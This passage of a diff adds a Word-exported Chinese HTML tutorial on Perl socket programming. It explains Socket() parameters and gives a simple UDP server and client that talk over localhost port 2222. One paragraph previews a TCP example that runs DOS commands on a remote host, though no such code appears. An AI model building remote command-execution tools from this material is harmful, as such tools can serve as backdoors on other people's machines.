+          Verdana'>&#21327;&#35758;&#32452;&#20013;&#20256;&#36755;&#23618;=
+&#30340;&#21327;&#35758;&#65292;&#36127;&#36131;&#23545;&#32593;&#32476;&#2=
+0256;&#36755;&#36827;&#34892;&#25511;&#21046;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UDP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20855;&#26377;&#19981;&#21487;&#38752;&#24615;&#65292;=
+&#20294;&#26159;&#25163;&#32493;&#31616;&#21333;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#22871;&#25509;&#23383;&#65306;&#=
+22871;&#25509;&#23383;&#26159;&#19968;&#20010;&#31867;&#20284;&#20110;&#259=
+91;&#20214;&#30340;&#21477;&#26564;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>.</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#36890;&#36807;&#24314;&#31435;&#22871;&#25509;&#23383;=
+&#23601;&#21487;&#20197;&#23545;&#22871;&#25509;&#23383;&#36827;&#34892;&#3=
+5835;&#20889;&#25805;&#20316;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20108;&#12289;&#36208;&#36827;</=
+span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl <=
+br>
+          Perl</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:V=
+erdana;
+          mso-hansi-font-family:Verdana'>&#30340;&#20989;&#25968;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Socket=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#26684;&#24335;&#20026;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Socket=
+(FILE,Domain,Type,Protocol);
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20854;&#20013;&#65306;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          FILE </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:=
+Verdana;
+          mso-hansi-font-family:Verdana'>&#32465;&#23450;&#19968;&#20010;&#=
+22871;&#25509;&#23383;&#21477;&#26564;&#65288;&#31867;&#20284;&#20110;&#251=
+71;&#24320;&#25991;&#20214;&#30340;&#21477;&#26564;&#65289;&#65307;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          Domain </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#34920;&#31034;&#22871;&#=
+25509;&#23383;&#30340;&#21327;&#35758;&#22495;&#31867;&#22411;&#12290;&#234=
+27;&#21487;&#20197;&#23450;&#20041;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Intern=
+et</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22495;&#65292;&#20854;&#20540;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>2</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65292;&#20063;&#21487;&#20197;&#23450;&#20041;&#20026;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UNIX</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22495;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>,</span><span style=3D'font-size:9.0pt;mso-a=
+scii-font-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#22914;&#26524;&#25226;&#=
+36825;&#20010;&#21464;&#37327;&#36171;&#20540;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>1</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#34920;&#31034;&#22495;&#30340;&#31867;&#22411;&#20026;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UNIX</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22495;&#12290;&#22914;&#26524;&#36825;&#20010;&#21464;=
+&#37327;&#20184;&#20540;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>2</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65292;&#21017;&#34920;&#31034;&#23450;&#20041;&#31867;=
+&#22411;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Intern=
+et</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#12290;&#25105;&#20204;&#24120;&#29992;&#30340;&#26159;=
+&#30340;&#22871;&#25509;&#23383;&#21327;&#35758;&#26063;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Intern=
+et</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#26063;&#12290;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          Type </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:=
+Verdana;
+          mso-hansi-font-family:Verdana'>&#34920;&#31034;&#22871;&#25509;&#=
+23383;&#31867;&#22411;&#65292;&#23450;&#20041;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>SOCK_S=
+TREAM</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31867;&#22411;&#65292;&#34920;&#31034;&#30340;&#26159;=
+&#22522;&#20110;&#27969;&#20256;&#36755;&#27169;&#24335;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>TCP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22871;&#25509;&#23383;&#12290;&#23450;&#20041;&#20026;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>SOCK_D=
+GRAM</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31867;&#22411;&#65292;&#34920;&#31034;&#20026;&#22522;=
+&#20110;&#31616;&#21333;&#25968;&#25454;&#20256;&#36882;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UDP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22871;&#25509;&#23383;&#12290;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          Protocol </span><span style=3D'font-size:9.0pt;mso-ascii-font-fam=
+ily:
+          Verdana;mso-hansi-font-family:Verdana'>&#34920;&#31034;&#22871;&#=
+25509;&#23383;&#30340;&#21327;&#35758;&#21495;&#65292;&#36825;&#20010;&#213=
+27;&#35758;&#21495;&#21487;&#20197;&#36890;&#36807;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20869;&#32622;&#20989;&#25968;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>getprotobyname()</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#24471;&#21040;&#12290;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19977;&#12289;&#31532;&#19968;&#=
+20010;&#20363;&#23376;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20363;&#23376;&#20171;&#32461;&#=
+65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#36825;&#20010;&#=
+31243;&#24207;&#23454;&#26159;&#19968;&#20010;&#31616;&#21333;&#30340;&#203=
+51;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>udp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#30340;&#26381;&#21153;&#22120;&#31243;=
+&#24207;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>,</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26381;&#21153;&#31471;&#31243;&#24207;&#22312;&#31471;=
+&#21475;&#19978;&#30417;&#21548;&#65292;&#24403;&#26377;&#23458;&#25143;&#3=
+6830;&#25509;&#21518;&#23427;&#23558;&#36820;&#22238;&#19968;&#20010;&#2596=
+8;&#25454;&#32473;&#23458;&#25143;&#31243;&#24207;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          #</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#27880;&#65306;&#22914;&#22270;</=
+span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>1-1 <b=
+r>
+          1</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#65294;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>UDP</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#26381;&#21153;&#31471;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          &lt;1 #!/usr/bin/Perl <br>
+          &lt;2 use strict; <br>
+          &lt;3 my $PF_INET=3D2; <br>
+          &lt;4 my $SOCK_DGRAM=3D2; <br>
+          &lt;5 my $port=3D2222; <br>
+          &lt;6 my $proto=3Dgetprotobyname('udp'); <br>
+          &lt;7 my $addres=3Dpack('SnC4x8',$PF_INET,$port,127,0,0,1); <br>
+          &lt;8 my ($Cmd,$test); <br>
+          &lt;9 socket(SOCKET,$PF_INET,$SOCK_DGRAM,$proto) or die &quot;Can=
+'t
+          build a socket&quot;; <br>
+          &lt;10 bind (SOCKET,$addres); <br>
+          &lt;11 $test=3D&quot;test\n&quot;; <br>
+          &lt;12 while(1){ <br>
+          &lt;13 my $rip=3Drecv (SOCKET,$Cmd,100,0); <br>
+          &lt;14 send (SOCKET,$test,0,$rip); <br>
+          &lt;15 print &quot;$Cmd&quot;; <br>
+          &lt;16&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#21407;&#20195;&#30721;&#35299;&#=
+26512;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1&nbsp; Perl</span><span style=3D'font-size:9.0pt;mso-ascii-f=
+ont-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#35299;&#37322;&#22120;&#=
+30340;&#36335;&#24452;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;2&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#20351;&#29992;&#20005;&#=
+26684;&#30340;&#35821;&#27861;&#20070;&#20889;&#31243;&#24207;&#12290;</spa=
+n><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;3&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#20026;</=
+span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Intern=
+et</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22495;&#22871;&#25509;&#23383;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;4&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#22871;&#=
+25509;&#23383;&#31867;&#22411;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UDP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#12290;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'> <br>
+          &lt;5&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#31243;&#=
+24207;&#30340;&#36827;&#31243;&#31471;&#21475;&#65288;&#36825;&#26679;&#234=
+58;&#25143;&#31243;&#24207;&#25165;&#33021;&#36830;&#25509;&#21040;&#36828;=
+&#31243;&#30340;&#26381;&#21153;&#31243;&#24207;&#65289;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;6&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#24471;&#21040;&#21327;&#=
+35758;&#21495;&#65292;&#36825;&#37324;&#26159;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>getpro=
+tobyname</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20989;&#25968;&#24471;&#21040;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>UDP</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#21327;&#35758;&#21495;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;7&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#22768;&#26126;&#21464;&#=
+37327;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;8&nbsp; $addres</span><span style=3D'font-size:9.0pt;mso-asci=
+i-font-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#20102;&#=
+19968;&#20010;&#26426;&#22120;&#30340;&#22320;&#22336;&#65288;&#36825;&#200=
+10;&#22320;&#22336;&#23601;&#26159;&#26426;&#22120;&#36776;&#35748;&#20854;=
+&#20182;&#26426;&#22120;&#30340;&#26631;&#24535;&#65289;&#65292;&#36825;&#2=
+0010;&#22320;&#22336;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>16</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#23383;&#33410;</span><span lang=3DEN-US style=3D'font-=
+size:
+          9.0pt;font-family:Verdana'>.</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#21=
+033;&#29992;&#20989;&#25968;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>pack()=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#25226;&#20182;&#36716;&#21270;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>2</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#36827;&#21046;&#26684;&#24335;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>.</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65288;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>$PF_INET</span><span style=3D'font-size:9.0p=
+t;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#65=
+289;&#21327;&#35758;&#22495;&#26159;&#19968;&#20010;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>16</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20301;&#65288;</span><span lang=3DEN-US style=3D'font-=
+size:
+          9.0pt;font-family:Verdana'>2</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#23=
+383;&#33410;&#65289;&#26080;&#31526;&#21495;&#30701;&#25972;&#25968;&#20540=
+;&#65307;&#65288;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>$port<=
+/span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65289;&#36827;&#31243;&#31471;&#21475;&#26159;&#19968;=
+&#20010;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>16</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20301;&#30701;&#25972;&#24418;&#65307;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IP</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22320;&#22336;&#26159;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>4</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20010;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>8</span><span style=3D'font-size:9.0pt;mso-a=
+scii-font-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#20301;&#26080;&#31526;&#=
+21495;&#23383;&#31526;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>.</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22240;&#20026;&#19968;&#20010;&#23436;&#20840;&#30340;=
+&#22320;&#22336;&#20540;&#26159;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>16</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#23383;&#33410;&#65292;&#25152;&#20197;&#24517;&#39035;=
+&#35201;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>8</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20010;&#31354;&#23383;&#33410;&#34917;&#40784;&#12290;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;9&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font-=
+family:
+          Verdana;mso-hansi-font-family:Verdana'>&#24314;&#31435;&#19968;&#=
+20010;&#22871;&#25509;&#23383;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;10 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#32465;&#23450;&#19968;&#=
+20010;&#22871;&#25509;&#23383;&#65288;&#22240;&#20026;&#19968;&#20010;&#228=
+06;&#37096;&#30340;&#26426;&#22120;&#24517;&#39035;&#30693;&#36947;&#20320;=
+&#30340;&#20855;&#20307;&#20301;&#32622;&#65292;&#25152;&#20197;&#31243;&#2=
+4207;&#24517;&#39035;&#24314;&#31435;&#19968;&#20010;&#36827;&#31243;&#3034=
+0;&#31471;&#21475;&#21495;&#65292;&#36825;&#26679;&#22806;&#37096;&#30340;&=
+#26426;&#22120;&#25165;&#33021;&#36830;&#25509;&#21040;&#36825;&#20010;&#26=
+381;&#21153;&#31243;&#24207;&#65289;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;11~16 </span><span style=3D'font-size:9.0pt;mso-ascii-font-fa=
+mily:
+          Verdana;mso-hansi-font-family:Verdana'>&#24314;&#31435;&#19968;&#=
+20010;&#30495;&#24490;&#29615;&#65292;&#19981;&#20572;&#22320;&#25509;&#259=
+10;&#22806;&#37096;&#28040;&#24687;&#65292;&#36890;&#36807;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>recv</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20989;&#25968;&#24471;&#21040;&#28040;&#24687;&#65288;=
+&#36825;&#20010;&#20989;&#25968;&#30340;&#36820;&#22238;&#20540;&#26159;&#3=
+6828;&#31243;&#23458;&#25143;&#30340;&#22320;&#22336;&#65292;&#36890;&#3680=
+7;&#35813;&#22320;&#22336;&#21487;&#20197;&#36827;&#34892;&#26381;&#21153;&=
+#22120;&#21644;&#23458;&#25143;&#36827;&#34892;&#25968;&#25454;&#20256;&#36=
+755;&#65289;&#65292;&#22312;&#36890;&#36807;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>send</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20989;&#25968;&#19982;&#36828;&#31243;&#20027;&#26426;=
+&#36827;&#34892;&#36890;&#35759;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#22235;&#12289;&#31532;&#20108;&#=
+20010;&#20363;&#23376;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20363;&#23376;&#20171;&#32461;&#=
+65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#30340;&#31243;&#=
+24207;&#26159;&#19968;&#20010;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>udp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#30340;&#23458;&#25143;&#31471;&#31243;=
+&#24207;&#65292;&#23458;&#25143;&#31471;&#31243;&#24207;&#20027;&#21160;&#3=
+6830;&#25509;&#26381;&#21153;&#31471;&#65292;&#22914;&#26524;&#32593;&#3247=
+6;&#36830;&#36890;&#25110;&#19981;&#21457;&#29983;&#25968;&#25454;&#25253;&=
+#20002;&#22833;&#65292;&#23558;&#20250;&#24471;&#21040;&#26381;&#21153;&#22=
+120;&#31471;&#30340;&#36820;&#22238;&#30340;&#25968;&#25454;&#12290;</span>=
+<span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#25105;&#20204;&#=
+30475;&#30475;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>tcp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#20363;&#23376;&#65292;&#23458;&#25143;&#31471;=
+&#31243;&#24207;&#26159;&#36828;&#31243;&#25191;&#34892;&#26381;&#21153;&#3=
+1471;&#21629;&#20196;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>C/S</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#32467;&#26500;&#30340;&#31243;&#24207;&#12290;&#26381;=
+&#21153;&#31471;&#31243;&#24207;&#32465;&#23450;&#19968;&#20010;&#31471;&#2=
+1475;&#65292;&#22788;&#29702;&#23458;&#25143;&#26029;&#30340;&#35831;&#2771=
+4;&#65292;&#24182;&#25226;&#22788;&#29702;&#21518;&#30340;&#25968;&#25454;&=
+#36820;&#22238;&#32473;&#23458;&#25143;&#31471;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>,</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#23458;&#25143;&#31471;&#31243;&#24207;&#36890;&#36807;=
+&#21457;&#36865;&#19968;&#26465;&#28040;&#24687;&#32473;&#36828;&#31243;&#2=
+0027;&#26426;&#65292;&#24182;&#25191;&#34892;&#36828;&#31243;&#20027;&#2642=
+6;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>dos</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21629;&#20196;&#65292;&#24471;&#21040;&#36828;&#31243;=
+&#26381;&#21153;&#22120;&#30340;&#36820;&#22238;&#28040;&#24687;&#12290;</s=
+pan><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#25105;&#20204;&#=
+26469;&#30475;&#30475;&#20195;&#30721;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          2</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#65294;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>UDP</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#23458;&#25143;&#31471;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1 #!/usr/bin/Perl <br>
+          &lt;2 use strict; <br>
+          &lt;3 my $PF_INET=3D2; <br>
+          &lt;4 my $SOCK_DGRAM=3D2; <br>
+          &lt;5 my $port=3D2222; <br>
+          &lt;6 my $proto=3Dgetprotobyname('udp'); <br>
+          &lt;7 my $data; <br>
+          &lt;8 my $addres=3Dpack('SnC4x8',$PF_INET,$port,127,0,0,1); <br>
+          &lt;9 socket(SOCKET,$PF_INET,$SOCK_DGRAM,$proto) or die &quot;Can=
+'t
+          build a socket&quot;; <br>
+          &lt;10 bind (SOCKET,$addres); <br>
+          &lt;11 send (SOCKET,$ARGV[0],0,$addres) or die &quot;send
+          false&quot;; <br>
+          &lt;12 recv (SOCKET,$data,200,0); <br>
+          &lt;13 print &quot;$data\n&quot;; <br>
+          &lt;14 if ($data) { <br>
+          &lt;15 send (SOCKET,&quot;Test&quot;,0,$addres) ; <br>
+          &lt;16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#23458;&#25143;&#31471;&#31243;&#=
+24207;&#38750;&#24120;&#31616;&#21333;&#65292;&#21807;&#19968;&#19981;&#215=
+16;&#30340;&#26159;&#19981;&#24314;&#31435;&#24490;&#29615;&#31561;&#24453;=
+&#36830;&#25509;</span><span
